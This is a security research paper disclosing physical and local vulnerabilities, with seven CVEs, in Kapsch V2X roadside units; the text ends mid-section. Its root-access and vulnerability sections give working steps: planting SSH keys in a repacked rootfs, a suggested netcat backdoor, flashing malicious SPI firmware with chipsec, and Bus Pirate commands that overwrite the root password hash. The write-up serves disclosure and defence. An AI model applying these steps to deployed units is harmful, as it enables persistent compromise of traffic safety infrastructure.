@@ -1,0 +1,1184 @@
+|=-----------------------------------------------------------------------=|
+|=---------------=[ Roadside to Everyone (R2E) Phase 1: ]=---------------=|
+|=---------=[ Physical & Local Vulnerabilities in (C)V2X RSUs ]=---------=|
+|=-----------------------------------------------------------------------=|
+|=----------=[ Jon Gaines - GainSec <phrack@gainsecmail.com> ]=----------=|
+|=-----------------------------------------------------------------------=|
+
+
+--[ Table of contents
+
+0. Intro
+1. Overview of (C)V2X & its associated technologies 
+    1.1 V2X & CV2X
+    1.2 DSRC & ITS-G5
+    1.3 RSU/OBU 
+2. Tested Devices
+    2.1 Models
+    2.2 Chipsets & Notable In-Circuit Components
+    2.3 Notable Physical Interfaces
+    2.4 Notable Firmware/Software 
+3. Attack Surface
+    3.1 Lack of Everything
+    3.2 Hardware
+    3.3 Pre-Embedded Operating System (EOS) (BIOS/Bootloader/Kernel)
+    3.4 Firmware/EOS
+4. Achieving Root
+    4.1 Simple and Useful
+    4.2 Quickest
+    4.3 Troubleshooting
+5. Batch 1 of Vulnerabilities: Multiple Paths to Persistent Backdoors
+    5.1 Insecure SPI Flash Permissions Allow Persistent Firmware 
+        Modification - CVE-2025-25733
+    5.2 Persistent Privilege Escalation via Modifiable EEPROM (SPD Write 
+        Disable Not Set) - CVE-2025-25732
+    5.3 Lack of SPI Protected Ranges Enables Unauthorized Flash 
+        Modification - CVE-2025-25735
+    5.4 Improper Access Control in EFI Boot Environment Allows Persistent
+        Firmware Modification - CVE-2025-25734
+    5.5 Improper SMM Lock Configuration - CVE-2025-25738
+    5.6 Unauthorized ADB Root Shell Access to Cellular Modem - 
+        CVE-2025-25736
+    5.7 Weak or Unset Default BIOS Supervisor/User Passwords Allow 
+        Unauthorized Firmware Access - CVE-2025-25737
+6. Phase 2: Onto the (C)V2X Client/Server Stack
+    6.1 Can I have some more? RJ45 Port + Second USB + ?
+    6.2 Android/iOS Applications 
+    6.3 RSU Server Stack
+    6.4 Remote Exploits
+7. Random Nuggets
+    7.1 Sniffing, Outdated Components, Certificates & Keys, External 
+        (Web Services) Oh my!
+8. References
+9. Raw Output 
+
+ 
+--[ 0. Introduction
+
+Roadside Units (RSUs) play a critical role in Vehicle-to-Everything (V2X) 
+communication, guiding autonomous vehicles, managing traffic flow, and even 
+assisting pedestrians. However, these units are often installed in public 
+locations with minimal physical security — the units I have are secured by 
+just four screws — making them highly vulnerable to physical attacks. Unlike
+traditional cyber threats that require remote exploitation, an attacker with
+brief physical access can stealthily gain persistent complete control 
+without any need for soldering or physical modifications. Once compromised,
+an RSU becomes an invisible tool for manipulating V2X systems, with 
+potentially catastrophic consequences.
+ 
+The risks are not theoretical, as more and more RSUs are deployed worldwide.
+Past hacks on roadside LED signs, often left unprotected, have shown how 
+easily public infrastructure can be tampered with. However, while a hacked 
+LED sign might display prank messages, a compromised RSU poses far greater 
+dangers. Attackers could mislead autonomous vehicles, disrupt traffic 
+signals, or even manipulate pedestrian safety systems. For example, a 
+visually impaired person relying on a V2X-enabled crossing alert could be 
+given false information, stepping into traffic at the wrong time. In fact, 
+the vendor of these RSUs has already developed an Android and iOS 
+application that assists visually impaired folks with crossing the street 
+safely [1]. Similarly, emergency vehicles could be rerouted into congestion,
+or fake hazard warnings could create unnecessary panic and detours. 
+ 
+As smart transportation systems become more widespread, securing RSUs 
+against stealthy local threats is no longer optional -- it is essential for 
+public safety and the integrity of connected infrastructure.
+ 
+This paper explores some of the physical and local vulnerabilities found in
+Kapsch TrafficCom RSUs, highlighting how easily they can be compromised and 
+the far-reaching impact of such attacks. This paper presents results from 
+phase 1 of a multi-phased approach to reverse engineer these units; the goal
+of Phase 1 was gaining root access. I'll also discuss what my plans are for 
+Phase 2. I was not expecting to have seven CVEs published -- CVE-2025-25732,
+CVE-2025-25733, CVE-2025-25734, CVE-2025-25735, CVE-2025-25736, 
+CVE-2025-25737, CVE-2025-25738. However, due to the low attack complexity 
+and never hearing back from the vendor after multiple attempts to contact 
+them, here we are. 
+ 
+Few things to note, I tried to keep general concepts/explanations, that 
+aren't unique to these devices, brief. I've included commands, outputs, 
+reproduction steps, etc. as much as I could. As I never heard back from the
+vendor, there are a good chunk of things that I've left out, as I don't 
+want to be sued. That said, where applicable, I included some source code 
+snippets, paths, binary names, etc. and hope to eventually upload all the 
+custom drivers, scripts, source code, etc. that I found on these devices one
+day. Check out my site or reach out for screenshots or further information. 
+Cela dit, entrons dans le vif du sujet!
+
+
+--[ 1. Overview of (C)V2X & its associated technologies 
+
+--[ 1.1 V2X & CV2X
+
+Vehicle-to-Everything (V2X) is a communication system that enables vehicles 
+to interact with various elements in their environment, including other 
+vehicles (V2V), infrastructure (V2I), pedestrians (V2P), and networks (V2N).
+This interaction aims to enhance road safety, improve traffic efficiency, 
+and support autonomous driving by facilitating the exchange of real-time 
+information. Cellular Vehicle-to-Everything (C-V2X) is a specific 
+implementation of V2X that utilizes cellular network technologies, such as 
+4G LTE and 5G, to provide two complementary communication modes. Often 
+called Direct Communication & Network Communication respectively. The 
+main thing to note for this paper and these units is that the CV2X units 
+(9260) support the same V2X that the V2X units (9160) only support. [2]
+
+V2V, V2I, V2P, V2N cover entire huge varieties of communications such as 
+Intelligent Traffic Signal Systems (ITSS), Interaction Geometry (MAP), 
+Signal Phase and Timing (SPaT) and much more. [3] This is out of scope of 
+Phase 1 though. 
+
+Although this technology isn't new, it's yet to be implemented on every
+corner worldwide. Below is a list of places where the RSUs I tested have 
+been deployed (some RSUs might be the newest model 7360 [12] which I 
+haven't found for sale on the 2nd hand market). 
+
+- Greeley, CO [4]
+- DOT I-70, CO [5]
+- Ohio [6]
+- Port Bilbao, Spain [7]
+- Ipswich, Australia [8]
+
+
+--[ 1.2 DSRC & ITS-G5
+
+Dedicated Short-Range Communications (DSRC) is a wireless communication
+technology specifically designed for vehicle-to-everything (V2X) 
+applications. It operates in the 5.9 GHz band and enables low latency, 
+high-reliability communication between vehicles (V2V), infrastructure 
+(V2I), and pedestrians (V2P). DSRC is based on IEEE 802.11p (11p) -- a 
+Wi-Fi variant for which you'll find old Atheros 9 Wireless Cards have a 
+custom Linux driver that supports sniffing -- and has been widely used for 
+safety-critical applications like collision avoidance, traffic signal 
+priority, and road hazard warnings. Compared to Cellular V2X (C-V2X), DSRC 
+has a shorter range and does not rely on cellular networks but are limited
+in scalability and future compatibility with 5G advancements. DSRC, 
+however, is what is widely used in the USA at least at the time of writing. 
+At the protocol level, which I'll expand on in a later phase, Wireless 
+Access in Vehicular Environment (WAVE) is utilized. 
+
+ITS-G5 is the current primary European standard for V2X. For simplicity
+of this paper, you can consider ITS-G5 a variant of DSRC as it's based off 
+DSRC and 11p. The RSU units I tested support both DSRC and ITS-G5. [9]
+
+
+--[ 1.2 RSU & OBU
+
+A roadside unit (RSU) and onboard unit (OBU) are communication devices that
+facilitate V2X communication. They are installed roadside and in-vehicle 
+(who would've thought) respectively. In Phase 1 I have not covered OBUs, 
+but I have acquired some and will start to test them soon. There are only a 
+few large vendors of these devices and since they are used in critical 
+infrastructure (at least in the case of RSUs) you will find many product 
+pages with no price, little to no documentation, and certainly no SDKs if 
+you can't provide a picture of a unit you own or at least a serial number.
+
+
+--[ 2. Tested Devices 
+
+--[ 2.1 Models 
+ 
+I originally planned to only test 1 9160 and 1 9260. However, over the 
+course of many trials and tribulations, I ended up soft bricking, frying or 
+otherwise running into situations where having more devices was needed or 
+ideal (copium). So logically I ended up with 6 units, although 2 are in a 
+somewhat broken state. If you're interested in what I did, feel free to 
+reach out, as long as you don't tease me. 
+
+Anyway, the model numbers of my units are: RIS-9160-1A0W [10] and 
+RIS-9260-1AEW (Which seems to be the basic configuration) [11]. In reality,
+the main difference between the two units is that the 9260 comes with an LTE
+modem (+ bridge board), and a configured wireless stack.
+
+FCC has some useful docs for these units, but they have been approved for a
+permanent confidentiality request so even the "technical manual" isn't super
+useful. Still worth checking out, but note that the unit shown in the 
+pictures seems to be a prototype or earlier/revision and the bridge board 
+has way more functionality than the units I've encountered in the wild. [13]
+
+
+--[ 2.2 Chipsets & Notable In-Circuit Components
+
+The main difference between the 9160 and 9260 is the addition of an LTE 
+module via bridge board (even the firmware/OS state of the 9260 is often
+the same as that of the 9160). What's nice about this is that I don't 
+have to list a ton of different components. 
+
+Computer-on-Module: COMe-mBTi10 (Here's a datasheet)[14]
+CPU: Intel E3825 
+RAM: 1GB
+SPI Flash Memory/EEPROM: Macronix MX25L6406E 8MB
+eMMC: 4gb (3.6gb accessible)
+RF: ALPS UMPZ2-ES4.1 (ALPS UMZ2 V753) (User Guide for a similar chip: [15])
+Hardware Monitor: Nuvoton NCT7802Y
+Ethernet Controller: Intel Ethernet Controller I210-AT
+GNSS: uBlox NEO-M8N-0-10
+LTE-Modem: QualComm
+
+I've included the block diagrams from the data sheets [10]
+
+Here's the block diagram for 9160:
+
+|----------------------------------------------------------------|
+|  5.9GHz      5.9GHz       GNSS       WLAN*      BT*      WWAN* |
+|----------------------------------------------------------------|
+|[ IEEE 802.11p radio (2x*) ]                                    |
+|[ WAVE 1609                ]   [ GNSS ]                         |
+|[ ETSI ITS GS              ]                                    |
+|[ 5.9 application layer    ]                                    |
+|[ 5.9 API                  ]                                    |
+|----------------------------------------------------------------|
+|                      5.9GHz radio communication                |
+|----------------------------------------------------------------|
+|                   Computer HW platform                         |
+|  ----------------------------------------------------------    |
+|  | Linux OS                  | Unique Serial No           |    |
+|  | TCP/IP Services           | Security Services          |    |
+|  | Watchdog                  | Real Time Clock            |    |
+|  | Temp Sensor               | Administration Services    |    |
+|  ----------------------------------------------------------    |
+|                                                                | 
+|               Platform & Resources & Protocols                 |
+|----------------------------------------------------------------|
+|                   External Interfaces                          |
+|  ----------------------------------------------------------    |
+|  | ETH (PoE)  | LEDs  | Ext.Power*  | GPIO*               |    |
+|  ----------------------------------------------------------    |
+|----------------------------------------------------------------|
+|               External radio interface extensions              |
+|  ----------------------------------------------------------    |
+|  | WLAN*  | BT*  | WWAN*                                  |    |
+|  ----------------------------------------------------------    |
+|                                                                |
+|               Modular internal extensions                      |
+|  ----------------------------------------------------------    |
+|  | SSD*  | hSD*  | USB*  | mPCIe*                         |    |
+|  ----------------------------------------------------------    |
+|                                                                |
+|               Operation & Maintenance                          |
+|  ----------------------------------------------------------    |
+| Device parameter setting & provisioning                   |    |
+|  |Firmware provisioning                                   |    |
+|  |Self-test / Supervision                                 |    |
+|  | Webserver*                                             |    |
+|  | Logging*                                               |    |
+|  | Monitoring*                                            |    |
+|  ----------------------------------------------------------    |
+-----------------------------------------------------------------|
+* Option  
+ 
+Here's the block diagram for 9260 [11]:
+
+---------------------------------------------------------------------
+|  5.9GHz      5.9GHz      5.9GHz      GNSS       3/4G*      GNSS    |
+|--------------------------------------------------------------------|
+|[ IEEE 802.11p radio (2x)(C-V2X*) ]                                 |
+|[ WAVE 1609                     ]   [ GNSS* ]                       |
+|[ ETSI ITS GS                   ]                                   |
+|[ 5.9 application layer         ]                                   |
+|[ 5.9 API                       ]                                   |
+|--------------------------------------------------------------------|
+|                      5.9 GHz radio communication                   |
+|--------------------------------------------------------------------|
+|                   Computer HW platform                             |
+|  ---------------------------------------------------------------   |
+|  | Linux OS                  | Unique Serial No                |   |
+|  | TCP/IP Services           | Security Services               |   |
+|  | Watchdog                  | Real Time Clock                 |   |
+|  | Temp Sensor               | Administration Services         |   |
+|  ---------------------------------------------------------------   |
+|                                                                    |
+|               Platform & Resources & Protocols                     |
+|--------------------------------------------------------------------|
+|                   External Interfaces (data, power)                |
+|  ---------------------------------------------------------------   |
+|  | ETH (PoE)  | LEDs  | 24/48VDC*  | GPIO*                     |   |
+|  ---------------------------------------------------------------   |
+|--------------------------------------------------------------------|
+|               Modular H/W & Extensions                             |
+|  ---------------------------------------------------------------   |
+|  | GNSS*  | BT*  | 34G*  | SSD*  | μSD*  | USB*  | mPCIe*  |   |   |
+|  ---------------------------------------------------------------   |
+|                                                                    |
+|               Operation & Maintenance                              |
+|  --------------------------------------------------------------    |
+|  | Device parameter setting & provisioning                    |    |
+|  | Firmware provisioning                                      |    |
+|  | Self-test / Supervision                                    |    |
+|  | Status LEDs                                                |    |
+|  | Web server*                                                |    |
+|  | Logging*                                                   |    |
+|  | Monitoring*                                                |    |
+|  --------------------------------------------------------------    |
+----------------------------------------------------------------------
+ * Option
+ 
+
+--[ 2.3 Notable Physical Interfaces
+
+The 9160 and 9260 have the following notable physical interfaces:
+ - a microSD slot
+ - a mSATA slot 
+ - 4 pins for read-only UART labeled "debug"
+ - 4 pins for I2C/SPI labeled "I2C"
+ - USB B Port (which can be configured for client or host via BIOS)
+ - a PoE RJ45 port
+ - some other goodies: there's another spot if you wanted to add
+   an additional radio and another set of pads labeled "USB." 
+
+Unique to 9260 are the following physical components/interfaces:
+- a bridge board with another set of read-only UART pins labeled "debug" 
+- an LTE modem with a dip switch
+- a micro-USB port 
+- a 3 pin and 4 pin set 
+
+Additionally, the 9260 has a second RJ45 port, but I haven't determined its 
+use yet.  
+
+
+--[ 2.4 Notable Firmware/Software
+
+LEO Versions: 3.2.0.829.23, 3.8.0.1119.42, 4.6.0.1211.28  
+Embedded OS (EOS) Linux Versions (They're based off ELBE/Debian):
+    9260: 3.16.35-c3p+, 9160: 4.9.124-ris-152.29
+Phoenix Secure Core: MVV1R976 X64 & MVV1R994 X64 
+V2X RSU Server: roadside 
+V2X Chipset Firmware Version: 1.19.0-deb9-x86 1002
+LTE Modem Firmware: MDM9650
+Other relevant binaries: acme (V2X radio test), llc (same thing but when 
+    using the Cobra Wireless binary [cw-llc]), rsu-configuration (custom 
+    V2X configuration script), cv2x-daemon & cv2x-config, C2X_HOST_APP.bin 
+    (API wrapper to interact with SXF17XX), aerolink libraries, 
+    v2x_radio_test, mm_server 
+
+I also included a list of custom debs found on the units in the raw output
+section of this paper. 
+
+
+--[ 3. Attack Surface 
+
+--[ 3.1 Lack of Everything
+
+To be blunt, there is a lot to this embedded device, and to the V2X/CV2X 
+stack, and since the device isn't on every corner or in every car, there 
+isn't much public information about it. There were some vulnerabilities 
+found in IPA utilized and I've covered the state of public vulnerabilities,
+teardowns, explanations or any other kind of information (easily) 
+accessible to the public. Due to this, the entire hardware side of 
+vehicle-to-everything, in its current state, is in its lack-of-everything. 
+Hopefully my work  -- however basic it is --  will get some other hackers
+jumping down these rabbit holes with or without me. 
+
+In the next few sections, I'm not going to list all the types of 
+vulnerabilities that you can find within each category but more just 
+to give a starting place to do your own research into them. 
+
+Most of the vulnerabilities from Phase 1 do not cover all the following
+categories so I'm opting to exclude going into vast detail. As I continue 
+with my research, I will write more about them.
+
+
+--[ 3.2 Hardware
+
+Obviously with so many physical components and interfaces, there is a ton 
+of attack surface. Whether it be attaching a SOIC clip to the SPI chip
+to overwrite the firmware, modify the EEPROM, read/modify over I2C,
+insert malicious drivers or boot off USB, mSata, or microSD. Not going to 
+list it all here, but the physical/hardware attack surface is extensive.
+
+
+--[ 3.3 Pre-Embedded Operating System (EOS) (BIOS/Bootloader/Kernel)
+
+The pre-EOS components are definitely a great place to start on the
+software/firmware side of things. There is some documentation on Phoenix 
+SecureCore and obviously plenty on syslinux. There are some custom kernel
+modules but I haven't had to do much beyond modifying kernel modules to get
+root access in Phase 1.
+
+
+--[ 3.4 Firmware/EOS
+
+A bunch of the firmware and EOS is closed source, custom, proprietary,
+confidential, requires a license and is in no meaningful way in the hands 
+of the public. That said, what I will state is, these units all run a 
+customized Embedded Linux Build Environment (ELBE) Debian-based Linux EOS. 
+They often utilize a modified version of firmware if not running a 
+completely custom firmware built from scratch. This ends up being so 
+fascinating as it's all new and custom but also, it's so much work to wrap
+your brain around it all. 
+
+One example: I found one blog post about wardriving/sniffing V2X (DSRC)
+signals which utilized old Atheros ATH9K wireless cards with custom drivers
+and a great DefCon lecture [16] but that's it. Then I found an academic 
+paper and a GitHub Repo -- which tracks which ATH9K Wireless NICs are 
+supported. The academic paper and GitHub repo mention that, *in theory* some
+ATH10 wireless cards should work on the devices as well. 
+So it was then wild to find a custom ATH10 firmware on the devices. 
+
+This firmware is located at:
+/mnt/c3platpersistent/opt/firmware/ath10k/QCA988X/hw2.0/
+
+
+--[ 4 - Achieving Root
+
+--[ 4.1 - Simple and Useful 
+
+These systems come shipped with an EFI shell (I know, right?) which makes 
+things a lot easier to deal with. There is a lot you can do via the EFI 
+shell but this section is going to cover the simplest path to gaining root 
+access on the device.
+
+Unscrew the four screws to pop the cover off the unit. Then attach your UART
+adapter to get output, insert your FAT32 formatted microSD card into the 
+port, and insert a keyboard into the USB port. Press F5 to enter the boot 
+menu upon connecting your PoE cable and select “Internal Shell”. Once in the
+EFI shell, you'll see that the microSD is mounted as fs0 and the system's
+emmc is mounted as fs1. Use the cp command to copy fs1: to fs0:.
+
+Command:
+
+  cp -r fs1:\ fs0:\images
+
+Unplug the PoE cable to shut off the unit, pop out the microSD and insert 
+it into a Linux box. cd to the microSD and then the /live/ directory.
+
+Now use unsquashfs -s rootfs to get information including compression and 
+block size which are needed to resquash the EOS after making modifications. 
+
+Cool, now you can cd into squashfs and view the EOS files. By default, these
+units are configured for IPv6 exclusively, so at minimum you need to add a
+bridge to etc/network/interfaces such as the following:
+
+  auth eth0:1
+  iface eth0:1 inet static
+  address 192.168.1.XXX
+  netmask 255.255.255.0
+  gateway 19.168.1.1
+
+Now, add your ssh public key to root/.ssh/authorized_keys and be sure
+to chmod the .ssh/ and authorized_keys files properly. Lastly, 
+uncomment the authorized_keys line within the sshd configuration file. 
+
+Now resquash the modified EOS filesystem via:
+
+mksquashfs squashfs-root output/rootfs -comp gzip -b 131072 -noappend
+
+Copy the new rootfs to the microSD, etc. Once back in the EFI shell,
+cp the new rootfs to /live/rootfs. For good measure, mv the Manifest
+and Manifest.asc files and rename them with .bak.
+
+Now exit the EFI shell, wait for the unit to boot and:
+ssh -i root_priv_key root@192.168.1.XXX.
+
+If you're prompted for a password, it's likely that the ssh server is
+asking for an outdated algorithm for the key, so use this to get around
+that temporarily:
+
+ssh -o PubkeyAcceptedAlgorithms=+ssh-rsa -i root_priv_key root@192.168.1.XXX
+
+Grats, you now have root access. 
+
+
+--[ 4.2 Quickest
+
+To gain just any type of root access, you can just add a netcat backdoor
+to rc.local, cron.d, a custom service or some other ways that you know.
+
+
+--[ 4.3 Troubleshooting
+
+On some units I needed to disable IPV6 completely. There are
+a bunch of ways to do this such as via modifying kernel parameters in
+/live/LIVE or in syslinux.cfg by adding 'ipv6.disable=1' to the
+APPEND line. Alternatively, by adding the following lines to
+/usr/tmplt/etc/sysctl.d/99-sysctl.conf:
+
+  net.ipv6.conf.all.disable_ipv6 = 1
+  net.ipv6.conf.default.disable_ipv6 = 1
+  net.ipv6.conf.lo.disable_ipv6 = 1
+
+If you're still having trouble getting the unit to be accessible over
+IPv4, I have a few other tips: 
+- Remove 'quiet' from the APPEND line
+- add 'console=ttyS0,115200N8'  
+
+There are a ton of other kernel parameters you can add to assist in 
+troubleshooting. 
+
+Although this shouldn't be needed, here are some other changes you can
+make:
+- comment out any lines in avahi-daemon.conf that mention ipv6
+- add eth0:1 to not be managed by avahi. 
+- Remove the 'rescue_mode=shell' from the APPEND line in RESCUE. 
+
+There are two versions of the EOS that the unit includes: the rescue and 
+live versions. It was a coin flip if the unit I got initially tried to boot
+to rescue or live. If it's booting to rescue, there are a few extra steps 
+but really you can modify the bootloader parameters to boot to live. 
+If you're struggling to get the device to boot to the live firmware image,
+just use the edit command within the EFI shell to modify the RESCUE file:
+- change the BOOT_IMAGE=/rescue/vmlinuz to BOOT_IMAGE=/live/vmlinuz 
+- change the value of root_sfs from root_sfs=/live/rootfs to 
+  root_sfs=/rescue/rootfs
+
+Now, you really shouldn't have to do this but if you're still having 
+trouble, you can look into modifying the update_ipconfig.sh script to get 
+IPv4 configured properly.  
+
+
+--[ 5 - Batch 1 of Vulnerabilities: Multiple Paths to Persistent Backdoors
+ 
+This first batch of vulnerabilities I've found are low hanging fruit, easy 
+to find when you've gained whichever level or type of access is required. 
+I will make some posts in the future going into much more detail of these 
+vulnerabilities, their underlying components, and eventually provide proof 
+of concepts (PoCs). Most are also fairly simple to fix (with physical access
+at least). That said, the fact that these types of hardware protections, 
+misconfigurations, etc were found across all the devices I have (both new 
+and used units) is wild. I put the cheesiest one last, so don't expect a 
+long explanation for that one.
+
+I've listed them with very self-explanatory titles though. As most of these
+vulnerabilities were found using the Chipsec framework [17], I'm going to 
+include the relevant raw output of the main chipsec scan results from 
+running chipsec_main.py against one of the units.
+
+
+--[ 5.1 - Insecure SPI Flash Permissions Allow Persistent Firmware 
+          Modification - CVE-2025-25733
+
+This vulnerability affects both the 9160 and 9260 RSUs and is a result of 
+missing access controls. Both models of the RSUs support Serial Peripheral 
+Interface (SPI) and contain a Winbond W25Q64JVSIQ NOR Flash Chip. Although 
+I laid out multiple ways to access SPI, the simplest way I've found is via
+Chipsec.
+ 
+Looking at the Chipsec output, you can see where this vulnerability was 
+found by the chipsec_main.py scan:
+ 
+[*] Software access to SPI flash regions: read = 0xFF, write = 0xFF
+[-] Software has write access to SPI flash descriptor
+[-] FAILED: SPI Flash Region Access Permissions are not programmed securely
+in flash descriptor
+
+This confirms the SPI Flash Descriptor, Basic Input Output System (BIOS),
+Intel Management Engine (ME), Gigabit Ethernet and Platform Data (PD) 
+firmware could be readable and writable.
+
+You can also use the chipsec utility script -- chipsec_util.py -- to confirm
+this vulnerability:
+ 
+fs0:\EFI\chipsec-1.13.8> python chipsec_util.py spi info
+
+Then to flash malicious firmware you can use:
+
+fs0:\EFI\chipsec-1.13.8> python chipsec_util.py spi write malicious_firmware.bin
+
+Then you can verify the modifications persisted:
+
+fs0:\EFI\chipsec-1.13.8> python chipsec_util.py spi dump verify_dump.bin
+diff malicious_firmware.bin verify_dump.bin
+
+Needless to say, there are countless ways to leverage this, along with the 
+fact that OS reinstalls/reboots do not affect this backdoor. Compromising 
+the platform firmware components stored on the SPI flash is fairly stealthy, 
+and if Secure Boot were to be enabled, this backdoor could enable a bypass.
+
+
+--[ 5.2 - Persistent Privilege Escalation via Modifiable EEPROM (Serial 
+          Presence Detect (SPD) Write Disable Not Set) - CVE-2025-25732
+ 
+This vulnerability affects both the 9160 and 9260 RSUs and is a result of 
+missing access controls. The EEPROM stores the root and default ('kapsch') 
+user password hashes, which are copied into /etc/shadow at boot. 
+
+This enables an attacker to:
+  - Modify EEPROM to insert their own password hashes
+  - Achieve persistent root access across reboots
+  - Exploit SSH auto-start in rescue/live mode for remote access
+
+Here's code from the bash script that the eeprom_handler service executes
+upon every boot:
+ 
+  function update_shadow_file_rootuser {
+    local ENCRYPTED_PASSWORD=$1
+
+    local TMPFILE=$(tempfile -m 0640) grep -v ^root /etc/shadow > ${TMPFILE}
+
+    local ROOT_LINE=$(grep ^root /etc/shadow | cut -d: -f1,3-)
+    echo ${ROOT_LINE} | sed -es":\::\:${ENCRYPTED_PASSWORD}\::" >> ${TMPFILE}
+
+    mv ${TMPFILE} /etc/shadow
+  }
+
+  function handle_root_password {
+    if [ ! -e ${ETC_EEPROM}/.p.eesign.status ]; then
+       return 0
+    fi
+    if [[ `cat ${ETC_EEPROM}/.p.eesign.status` != 'ok' ]]; then
+       return 0
+    fi
+    if [ ! -e ${ETC_EEPROM}/p.root.password ]; then
+       return 0
+    fi 
+   
+   update_shadow_file_rootuser `cat ${ETC_EEPROM}/p.root.password`
+
+Lets look at the Chipsec output that flags the actual issue:
+ 
+  [x][ Module: SPD Write Disable
+  [*] SMBUS_HCFG = 0x01 << Host
+  Configuration (b:d.f 00:31.3 + 0x40)
+    [04] SPD_WD           = 0 << SPD_WD 
+  [-] FAILED: SPD Write Disable is not set and SPDs were detected
+
+To read the root users hashed password with bus pirate:
+ 
+  [0xAE 0x05 0xC9] [0xAF r:16]
+
+Which returns something like:
+  RX: 0x15 ACK 0x6F ACK 0x2E ACK 0x6F ACK 0x70 ACK 0x65 ACK 0x72 ACK 0x61
+  ACK..
+
+When you decode, it looks like:
+
+  $6$BqXRbsRiiI1MI6WE$RT68Njgv1LyqxjgNJ8Od1mLjm0NuWbEE7
+  6z35a4XXXu7.SosIHaCgABcGM1s4xTFOywTaNFLu9SCXXXSvAPo.1
+        
+
+Now with physical access, you can use the following command to overwrite
+the root user's hash (replace the bytes after the 3rd byte on each line
+with the hash you want )
+ 
+Bus Pirate Command (One line at a time):
+ 
+ [0xAE 0x05 0xC9 0x24 0x36 0x24 0x5a 0x39 0x4c 0x37 0x58 0x71 0x4b
+0x6a 0x4b 0x38 0x34 0x76 0x77]
+ [0xAE 0x05 0xD9 0x65 0x45 0x4f 0x24
+0x78 0x7a 0x47 0x6c 0x63 0x5a 0x54 0x37 0x51 0x45 0x6a 0x35]
+ [0xAE
+0x05 0xE9 0x55 0x6d 0x58 0x52 0x71 0x6b 0x70 0x78 0x36 0x39 0x42 0x66
+0x4b 0x36 0x62 0x57]
+ [0xAE 0x05 0xF9 0x47 0x4a 0x57 0x73 0x4b 0x41 0x75
+0x46 0x31 0x75 0x36 0x44 0x39 0x4a 0x59 0x71]
+ [0xAE 0x06 0x09 0x32 0x6a
+0x41 0x4b 0x50 0x68 0x79 0x6d 0x42 0x35 0x38 0x33 0x61 0x69 0x4a 0x35]
+ [0xAE 0x06 0x19 0x2f 0x75 0x50 0x70 0x45 0x41 0x48 0x67 0x47 0x32
+0x4a 0x79 0x72 0x67 0x5a 0x4e]
+ [0xAE 0x06 0x29 0x79 0x35 0x43 0x62
+0x77 0x77 0x34 0x6b 0x44 0x31]
+ 
+ 
+Alternatively, with local access the RSUs come preinstalled with at least 
+two tools that allow you to modify the EEPROM in userspace. 
+ 
+First is infotool, an interactive custom information tool included with 
+the firmware. Output looks like:
+ 
+  Kapsch >> Info Tool  
+  --------------------  
+  Information  
+  ------------  
+  EEPROMs  
+  ------------  
+  CB  
+  ------------  
+  <
+  press up for more ... >  
+  p.obslot0.serial      : NLXX132E00XXXX  
+  p.pps.offset         : 0x00  
+  p.ps.extpower       : 1  
+  p.ps.poe
+  : 1  
+  p.radio1.a.mac      : 00:e0:6a:01:xx:xx  
+  p.radio1.ant1.atten :
+  5  
+  p.radio1.ant2.atten : 10  
+  p.radio1.b.mac      : 00:e0:6a:01:xx:xx
+  p.radio1.name       : ALPS-UMPZ2A3001A  
+  p.radio2.a.mac      :
+  00:E0:4B:57:XX:XX  
+  p.radio2.ant1.atten : 5  
+  p.radio2.ant2.atten :
+  10  
+  p.radio2.b.mac      : 00:E0:4B:57:XX:XX  
+  p.radio2.name       :
+  ALPS UMZ2 V753  
+  p.revision          : 03  
+  p.root.password     :
+  $6$BqXRBsRiiIMI6WE$RT68NjgvLlxxxjgNJ80d1mLjm0NWuXXX6z35a4oKcu7.Sos
+  p.serial            : PZB00XXX  
+  < press down for more ... >  
+
+Additionally Infotool lets you modify as well:
+ 
+  Kapsch  >> Info Tool  
+  ----------------------  
+  [ Change Settings ]  
+ 
+  <  EEPROM Editor  
+  <  EEPROM Add Key  
+  <  EEPROM Delete Key  
+ 
+And second is eeprom_tool.
+ 
+A bonus is the eeprom_write_enable.sh in case you accidentally disable write 
+or the unit you acquired had write disabled (the 6 I have do not)
+
+
+--[ 5.3 - Lack of SPI Protected Ranges Enables Unauthorized Flash 
+          Modification - CVE-2025-25735
+
+This vulnerability affects both the 9160 and 9260 RSUs and is a result of 
+missing access controls. You can view this as the software/userspace side 
+of section 6.1. SPI Protected Range Registers (PRRs) are not set, meaning 
+there is no software-based restriction preventing unauthorized SPI flash 
+modifications. The system doesn't prevent runtime modifications to critical 
+firmware. Ultimately this allows firmware tampering at runtime for the
+same regions as in 6.1. Additionally, it allows malware to disable security
+features before reboot. 
+ 
+No need to rehash what I covered in 4.2 and 6.1, so here's the Chipsec 
+output confirming this vulnerability:
+ 
+  [*] FRAP = 0x0000FFFF << SPI Flash Regions Access Permissions Register
+  (SPIBAR + 0x50)
+      [00] BRRA             = FF << BIOS Region Read Access 
+      [08] BRWA             = FF << BIOS Region Write Access 
+  [*] Software access to SPI flash regions: read = 0xFF, write = 0xFF 
+
+
+--[ 5.4 - Improper Access Control in EFI Boot Environment Allows Persistent 
+          Firmware Modification - CVE-2025-25734
+
+This vulnerability affects both the 9160 and 9260 RSUs and is a result of
+missing access controls. Specifically, Secure Boot UEFI variables are 
+protected BUT Secure Boot is disabled. So no problem if I can't modify them.
+I think the attack path leveraging this is very obvious: Secure Boot is 
+disabled, so the BIOS allows execution of unsigned bootloaders and OS 
+kernels. This vulnerability is especially helpful, as it made getting access
+to the EOS/Userspace trivial.
+
+Relevant Chipsec output: 
+ 
+[*] Secure Boot appears to be disabled
+[+] PASSED: All Secure Boot UEFI variables are protected
+
+ --[ 5.5 - Improper SMM Lock Configuration Enables Unauthorized System
+Management Mode (SMM) Modification
+- CVE-2025-25738
+ 
+The UEFI menu shows SMM Lock = Disabled. This control locks SMRAM to 
+prevent non-SMM code from modifying SMM handlers. With it disabled, 
+a kernel privileged attacker can alter SMM handlers and gain SMM 
+code execution, which operates outside the OS and hypervisor. 
+This significantly raises the risk of stealthy compromise. 
+However, persistence across reboots requires separate weaknesses 
+or bypasses in firmware write-protection (BLE/BIOSWE, SMM_BWP). 
+SMM Lock alone does not ensure persistent firmware infection, 
+and OS based tools generally cannot inspect SMRAM.
+
+Screenshot from UEFI menu Confirming SMM Lock is disabled linked below:
+
+https://github.com/GainSec/Phrack-72-Raw-Output-V2X/blob/main/Raw-Output/SMM-Lock-Disabled.png
+
+--[ 5.6 - Unauthorized ADB Root Shell Access to Cellular Modem 
+          - CVE-2025-25736
+
+Now we're into even more low hanging fruit territory. This vulnerability 
+only affects 9260 RSUs aka the CV2X units, as the 9160s do not have an 
+LTE modem. 
+
+From the local access approach, platform-tools including adb are installed 
